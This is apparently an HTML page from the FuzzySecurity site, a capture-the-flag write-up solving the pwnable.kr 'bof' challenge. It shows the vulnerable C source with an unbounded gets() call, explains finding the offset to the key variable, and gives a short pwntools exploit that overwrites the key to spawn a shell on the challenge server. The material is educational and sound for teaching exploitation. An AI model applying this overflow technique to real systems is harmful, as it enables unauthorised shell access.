@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Linux ExploitDev: Part 3</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+    
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../../js/shCore.js"></script>
+	<script type="text/javascript" src="../../js/shBrushCpp.js"></script>
+	<script type="text/javascript" src="../../js/shBrushPython.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../../index.html">Home</a>
+            </li>
+            <li><a href="../../tutorials.html" class="active">Tutorials</a>
+            </li>
+            <li><a href="../../coding.html">Scripting</a>
+            </li>
+            <li><a href="../../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../../links.html">Links</a>
+            </li>
+            <li><a href="../../patreon.html">Patreon</a></li><li><a href="../../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../../tutorials.html">Tutorials</a> <b>&#187;</b></li>
+          <li>Buffer Overflow [Pwnable.kr -> bof]</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="eighteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Part 3: Buffer Overflow [Pwnable.kr -> bof]<span class="line"></span></h2>
+        <p>Hola, this is an attempt to revive the linux exploit development series through pwnables (Yaaaaay)! In this first post we will have a look at the BOF challenge on <a href="http://pwnable.kr/play.php">pawnable.kr</a>. This is a simple buffer overflow on 32bit Linux, let get straight into it!</p>
+        
+        <br />
+      <div class="fourteen columns bottom">
+      <h2 class="title">Recon the challenge<span class="line"></span></h2>
+      <p>For this challenge we get the source code, “bof.c”, which is shown below.</p><br />
+    <div class="main_wrap_support">
+<pre class="brush: c;gutter:false;auto-links: false;;">
+#include &lt;stdio.h>
+#include &lt;string.h>
+#include &lt;stdlib.h>
+void func(int key){
+        char overflowme[32];
+        printf("overflow me : ");
+        gets(overflowme);       // smash me!
+        if(key == 0xcafebabe){
+                system("/bin/sh");
+        }
+        else{
+                printf("Nah..\n");
+        }
+}
+int main(int argc, char* argv[]){
+        func(0xdeadbeef);
+        return 0;
+}</pre>
+</div>
+    
+<p>&nbsp;</p>
+<p>The program calls func with one input parameter, key, set to 0xdeadbeef. It then checks if the key parameter is 0xcafebabe (obviously this will never be the case) and if it is it gives the user a shell, else it prints “Nah..” and exits. The graph view below shows this same logic.</p>
+
+<p>&nbsp;</p>
+<img src="images/Pwnable_BOF1.png">
+<p>&nbsp;</p>
+
+<p>An obvious solution presents itself here. The allocated input buffer is 32 bytes in length but the user supplied input has no length restrictions. If we overflow the buffer we can manually replace 0xdeadbeef with 0xcafebabe in memory. Let's quickly check that the program crashes, as expected, when we send a large input buffer.</p>
+
+<p>&nbsp;</p>
+<img src="images/Pwnable_BOF2.png">
+<p>&nbsp;</p>
+
+<h2 class="title">Pwn all the things!<span class="line"></span></h2>
+<p>We could spray memory with chunks of 0xcafebabe and hope for the best (this does actually work in this case) but we may as well do this properly. Using pattern create we can find the precise offset to the key variable from our input buffer.</p>
+    
+<p>&nbsp;</p>
+<img src="images/Pwnable_BOF3.png">
+<p>&nbsp;</p>
+
+<p>Notice that we are setting a breakpoint on the comparison. Once we hit the breakpoint we can inspect the contents at EBP+8 to figure out the offset.</p>
+
+<p>&nbsp;</p>
+<img src="images/Pwnable_BOF4.png">
+
+<h2 class="title">Game Over<span class="line"></span></h2>
+<p>The start of the key variable is at character 53+. Using pwntools we can quickly make a POC.</p><br />
+    <div class="main_wrap_support">
+<pre class="brush: py;gutter:false;auto-links: false;;">
+from pwn import *
+
+r = remote('pwnable.kr', 9000)
+buff = ("\x41"*52) + "\xbe\xba\xfe\xca"
+
+r.send(buff)
+r.interactive()</pre>
+</div>
+
+<p>&nbsp;</p>
+<p>When we fire it at the server, we pass the key value check and get a shell!</p>
+
+<p>&nbsp;</p>
+<img src="images/Pwnable_BOF5.png">
+<p>&nbsp;</p>
+
+<br />
+</div>
+    </div>
+</div>
+
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../../index.html">Home</a> |
+          <a href="../../tutorials.html">Tutorials</a> |
+          <a href="../../coding.html">Scripting</a> |
+          <a href="../../exploits.html">Exploits</a> |
+          <a href="../../links.html">Links</a> |
+          <a href="../../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
